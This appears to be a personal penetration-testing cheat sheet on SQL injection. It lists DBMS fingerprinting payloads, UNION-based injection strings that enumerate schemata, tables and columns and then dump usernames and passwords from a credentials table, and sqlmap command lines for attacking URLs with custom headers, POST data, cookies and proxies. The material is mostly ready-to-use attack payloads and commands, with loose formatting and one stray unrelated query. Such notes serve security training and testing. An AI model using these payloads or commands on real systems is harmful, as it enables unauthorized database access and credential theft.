---
description: >-
  Occurs when some malicious payload could be interpreted on a SQL query and
  subvert it's logic to manipulate an victimize database
---

# SQLI
|Payload 	       | When to Use 	      Expected Output 	Wrong Output
|SELECT @@version  | When we have full query output 	MySQL Version 'i.e. 10.3.22-MariaDB-1ubuntu1' 	In MSSQL it returns MSSQL version. Error with other DBMS.
|SELECT POW(1,1)   | When we only have numeric output 	1 	Error with other DBMS
|SELECT SLEEP(5)   | Blind/No Output 	Delays page response for 5 seconds and returns 0. 	Will not delay response with other DBMS

```bash
List of databases
List of tables within each database
List of columns within each table
```

Enumerate databases

To start our enumeration, we should find what databases are available on the
DBMS. The table SCHEMATA in the INFORMATION_SCHEMA database contains
information about all databases on the server. It is used to obtain database
names so we can then query them. The SCHEMA_NAME column contains all the
database names currently present.

```sql
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```

```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

```sql
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```

select * from INFORMATION_SCHEMA.TABLES where table_schema='us_counties_pop_est_2019';
















# SQLmap
# Sqlmap based on request retrive by browser

sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86*64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/\_' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'

# Default post

sqlmap 'http://www.example.com/' --data 'uid=1&name=test'

```
 Tip: similarly to the case with the '--data' option, within the saved request file, we can specify the parameter we want to inject in with an asterisk (*), such as '/?id=*'.
```

# set cookie

sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'

this flag could be used to simulate a phone User-Agent
--mobile

#Display Errors

The first step is usually to switch the --parse-errors, to parse the DBMS errors (if any) and displays them as part of the program run:

# Store traffic

Use the flag -t
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt

# Redirect traffic to a proxy

use the flag --proxy


